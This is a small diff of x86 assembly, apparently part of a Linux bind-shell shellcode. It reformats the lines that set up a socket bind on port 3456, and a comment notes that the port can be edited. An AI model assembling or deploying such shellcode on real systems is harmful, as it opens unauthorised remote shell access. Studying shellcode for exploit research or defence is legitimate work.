@@ -29,11 +29,11 @@ pop eax
 inc ebx ;  incremented ebx once again to equal 2 SYS_BIND
 push edx ;  push edx because it equals 0
 push word 0x800d ;  <--- port 3456 in reverse hex {can be edited here to change port}
-push word 0x2 ;  AF_INET = 2mov ecx, esp ;  ecx has a pointer to the structpush 0x10 ;  size 16
+push word 0x2 ;  AF_INET = 2
 
-mov ecx, esp ;ecx has a pointer to the struct
+mov ecx, esp ;  ecx has a pointer to the struct
 
-push 0x10; size
+push 0x10 ;  size 16
 push ecx ;  pointer to the bind struct
 push edi ;  socket fd
 mov ecx, esp ;  ecx now contains all the arguments required
